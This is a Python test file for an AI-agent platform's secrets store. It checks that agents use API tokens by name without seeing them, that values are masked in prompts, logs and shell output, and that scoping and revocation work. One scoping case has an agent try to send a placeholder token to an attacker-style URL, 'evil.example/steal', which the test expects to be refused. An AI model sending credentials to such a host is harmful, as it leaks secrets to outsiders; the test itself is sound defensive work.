"""Secrets agents use by name without ever seeing the value (issue #2)."""

from __future__ import annotations

import json
import logging
import sys

import httpx

from app.agents.prompt import build_system_prompt
from app.models import Agent, LlmCall, Memory, Message, Org, SecretUse, ToolCall, Turn
from app.services import comms, memory, secrets
from app.tools import base
from tests.conftest import wait_for
from tests.helpers import call, dm, make_agent, make_org, rows, say, script

TOKEN = "ghp_SuperSecretValue1234567890"


async def _turn_done(agent_id: str, n: int = 1) -> bool:
    turns = await rows(Turn, Turn.agent_id == agent_id)
    return sum(t.status in ("completed", "failed") for t in turns) >= n


async def _setup(app_client, **secret):
    org = await make_org(app_client)
    vega = await make_agent(app_client, org["id"], "Vega", tools=[
        {"name": "fetch_url", "approval": "auto"}, {"name": "run_command", "approval": "auto"},
        {"name": "list_secrets", "approval": "auto"}, {"name": "send_message", "approval": "auto"}])
    r = await app_client.post(f"/api/v1/orgs/{org['id']}/secrets", json={
        "name": "github_token", "value": TOKEN, "description": "GitHub API",
        "agents": ["Vega"], "domains": ["api.github.com"], **secret})
    assert r.status_code == 201, r.text
    return org, vega, r.json()


def _mock_http(monkeypatch, seen: list[httpx.Request]):
    def handler(request: httpx.Request) -> httpx.Response:
        seen.append(request)
        # A careless API that echoes the credential back.
        return httpx.Response(200, json={"you_sent": request.headers.get("authorization", ""),
                                         "url": str(request.url)})

    real = httpx.AsyncClient
    monkeypatch.setattr(httpx, "AsyncClient",
                        lambda *a, **k: real(*a, transport=httpx.MockTransport(handler), **k))


async def _everything_stored(org_id: str) -> str:
    """Every text the platform persisted for this org, to prove the value is nowhere."""
    parts = []
    for model in (ToolCall, Message, Memory, LlmCall):
        for row in await rows(model, model.org_id == org_id):
            parts.append(json.dumps({c.name: getattr(row, c.name) for c in row.__table__.columns},
                                    default=str))
    return "\n".join(parts)


async def test_values_are_write_only(app_client):
    org, _, created = await _setup(app_client)
    assert created["name"] == "GITHUB_TOKEN" and created["hasValue"] is True
    listed = (await app_client.get(f"/api/v1/orgs/{org['id']}/secrets")).json()
    assert TOKEN not in json.dumps(listed) and TOKEN not in json.dumps(created)
    assert listed[0]["agents"] == ["Vega"] and listed[0]["domains"] == ["api.github.com"]

    bad = await app_client.post(f"/api/v1/orgs/{org['id']}/secrets", json={"name": "x", "value": "v"})
    assert bad.status_code == 400 and "UPPER_SNAKE" in bad.json()["detail"]
    dup = await app_client.post(f"/api/v1/orgs/{org['id']}/secrets",
                                json={"name": "GITHUB_TOKEN", "value": "other"})
    assert dup.status_code == 400
    # Export never includes secrets.
    exported = (await app_client.get(f"/api/v1/orgs/{org['id']}/export")).text
    assert TOKEN not in exported and "GITHUB_TOKEN" not in exported


async def test_agent_calls_an_api_without_ever_seeing_the_token(app_client, monkeypatch):
    org, vega, _ = await _setup(app_client)
    seen: list[httpx.Request] = []
    _mock_http(monkeypatch, seen)
    prompts = script(vega["id"], call("fetch_url", url="https://api.github.com/user",
                                      headers={"Authorization": "Bearer {{secret:GITHUB_TOKEN}}"}),
                     say("done"))
    await dm(app_client, org["id"], "Vega", "who am I on GitHub?")
    await wait_for(lambda: _turn_done(vega["id"]), msg="turn")

    assert seen[0].headers["authorization"] == f"Bearer {TOKEN}"  # the API got the real value
    seen_by_model = [str(m.content) for m in prompts[1] if m.type == "tool"][-1]
    assert TOKEN not in seen_by_model and "Bearer [secret:GITHUB_TOKEN]" in seen_by_model
    assert TOKEN not in await _everything_stored(org["id"])
    rec = (await rows(ToolCall, ToolCall.agent_id == vega["id"]))[0]
    assert rec.args["headers"]["Authorization"] == "Bearer {{secret:GITHUB_TOKEN}}"

    used = await rows(SecretUse, SecretUse.org_id == org["id"])
    assert [(u.secret_name, u.tool, u.target) for u in used] == [
        ("GITHUB_TOKEN", "fetch_url", "api.github.com")]
    usage = (await app_client.get(f"/api/v1/orgs/{org['id']}/secrets/usage")).json()
    assert usage[0]["agent"] == "Vega"


async def test_scoping_and_instant_revocation(app_client, monkeypatch):
    org, vega, created = await _setup(app_client)
    other = await make_agent(app_client, org["id"], "Iris", tools=[{"name": "fetch_url", "approval": "auto"}])
    seen: list[httpx.Request] = []
    _mock_http(monkeypatch, seen)
    fetch = base.builtin("fetch_url").handler

    from app.tools.base import ToolContext

    async def ctx_for(agent_id):
        o = (await rows(Org, Org.id == org["id"]))[0]
        a = (await rows(Agent, Agent.id == agent_id))[0]
        return ToolContext(org=o, agent=a, turn_id=None, tool_call_id="t", depth=0)

    hdr = {"Authorization": "Bearer {{secret:GITHUB_TOKEN}}"}
    for agent_id, url, expect in (
        (other["id"], "https://api.github.com/user", "aren't allowed to use GITHUB_TOKEN"),
        (vega["id"], "https://evil.example/steal", "may only be sent to api.github.com"),
        (vega["id"], "https://api.github.com/x?k={{secret:NOPE}}", "no secret named NOPE"),
    ):
        try:
            await fetch({"url": url, "headers": hdr}, await ctx_for(agent_id))
            raise AssertionError("should have been refused")
        except base.ToolError as e:
            assert expect in str(e) and TOKEN not in str(e)
    assert seen == []  # nothing was sent anywhere

    await app_client.patch(f"/api/v1/secrets/{created['id']}", json={"enabled": False})
    try:
        await fetch({"url": "https://api.github.com/user", "headers": hdr}, await ctx_for(vega["id"]))
        raise AssertionError("disabled secret was used")
    except base.ToolError as e:
        assert "disabled" in str(e)

    assert (await app_client.delete(f"/api/v1/secrets/{created['id']}")).status_code == 204
    # Still masked after deletion: copies may linger.
    assert secrets.redact(org["id"], f"x {TOKEN} y") == "x [secret:GITHUB_TOKEN] y"


async def test_shell_access_is_opt_in_and_masked(app_client):
    org, vega, created = await _setup(app_client)
    from app.tools.base import ToolContext

    o = (await rows(Org, Org.id == org["id"]))[0]
    a = (await rows(Agent, Agent.id == vega["id"]))[0]
    ctx = ToolContext(org=o, agent=a, turn_id=None, tool_call_id="t", depth=0)
    from app.tools.resolve import EffectiveTool, execute

    tool = EffectiveTool("run_command", "", {}, "auto", spec=base.builtin("run_command"))
    # Print the variable from Python, so the test doesn't depend on the shell's syntax.
    show = f'"{sys.executable}" -c "import os,sys; print([os.environ.get(sys.argv[1])])" GITHUB_TOKEN'
    out, _ = await execute(tool, {"command": show}, ctx)
    assert "[None]" in out  # not shell-enabled: the variable isn't set

    await app_client.patch(f"/api/v1/secrets/{created['id']}", json={"allowShell": True})
    out, _ = await execute(tool, {"command": show}, ctx)
    assert TOKEN not in out and "['[secret:GITHUB_TOKEN]']" in out  # set, and masked in output
    used = await rows(SecretUse, SecretUse.org_id == org["id"])
    assert [(u.secret_name, u.tool, u.target) for u in used] == [("GITHUB_TOKEN", "run_command", "shell")]


async def test_messages_memories_and_logs_never_keep_a_value(app_client, caplog):
    org, vega, _ = await _setup(app_client)
    msg = await comms.post(org["id"], comms.Sender.user(), f"here it is {TOKEN}",
                           channel=None, to_agents=[vega["id"]])
    assert TOKEN not in msg.content and "[secret:GITHUB_TOKEN]" in msg.content
    mem = await memory.add(org["id"], f"the token is {TOKEN}", agent_id=vega["id"])
    assert TOKEN not in mem.content

    log = logging.getLogger("pantheon.test")
    handler = logging.StreamHandler()
    handler.addFilter(secrets.RedactingFilter())
    captured = []
    handler.emit = lambda record: captured.append(handler.format(record))
    log.addHandler(handler)
    try:
        log.warning("request failed for %s", f"https://x/?k={TOKEN}")
        try:
            raise RuntimeError(f"bad token {TOKEN}")
        except RuntimeError:
            log.exception("boom")
    finally:
        log.removeHandler(handler)
    assert captured and all(TOKEN not in line for line in captured)
    assert "[secret:GITHUB_TOKEN]" in captured[0]


async def test_agents_and_zeus_see_names_never_values(app_client):
    org, vega, _ = await _setup(app_client)
    o = (await rows(Org, Org.id == org["id"]))[0]
    a = (await rows(Agent, Agent.id == vega["id"]))[0]
    prompt = await build_system_prompt(o, a)
    assert "# Secrets you can use" in prompt and "GITHUB_TOKEN" in prompt and TOKEN not in prompt

    zeus_list = await base.builtin("list_org_secrets").handler({"org": org["id"]}, None)
    assert "GITHUB_TOKEN" in zeus_list and "Vega" in zeus_list and TOKEN not in zeus_list
    iris = await make_agent(app_client, org["id"], "Iris")
    grant = base.builtin("grant_secret").handler
    assert "Iris can now use GITHUB_TOKEN" in await grant(
        {"org": org["id"], "secret": "github_token", "agent": "Iris"}, None)
    assert "can no longer use" in await grant(
        {"org": org["id"], "secret": "GITHUB_TOKEN", "agent": "Iris", "revoke": True}, None)
    assert iris


async def test_custom_http_tools_use_secrets_by_name(app_client, monkeypatch):
    from app.services import customtools
    from app.tools.base import ToolContext

    org, vega, _ = await _setup(app_client)
    seen: list[httpx.Request] = []
    _mock_http(monkeypatch, seen)
    await customtools.save(
        "gh_repo", "Look up a GitHub repo", "http",
        {"type": "object", "properties": {"repo": {"type": "string"}}, "required": ["repo"]},
        {"method": "GET", "url": "https://api.github.com/repos/{repo}",
         "headers": {"Authorization": "Bearer {{secret:GITHUB_TOKEN}}"}}, "auto")
    o = (await rows(Org, Org.id == org["id"]))[0]
    a = (await rows(Agent, Agent.id == vega["id"]))[0]
    ctx = ToolContext(org=o, agent=a, turn_id=None, tool_call_id="t", depth=0)
    from app.tools.resolve import EffectiveTool, execute

    tool = EffectiveTool("gh_repo", "", {}, "auto", spec=base.builtin("gh_repo"))
    out, ok = await execute(tool, {"repo": "octo/hello"}, ctx)
    assert ok, out
    assert seen[0].headers["authorization"] == f"Bearer {TOKEN}"
    assert str(seen[0].url) == "https://api.github.com/repos/octo%2Fhello"
    assert TOKEN not in out and "[secret:GITHUB_TOKEN]" in out
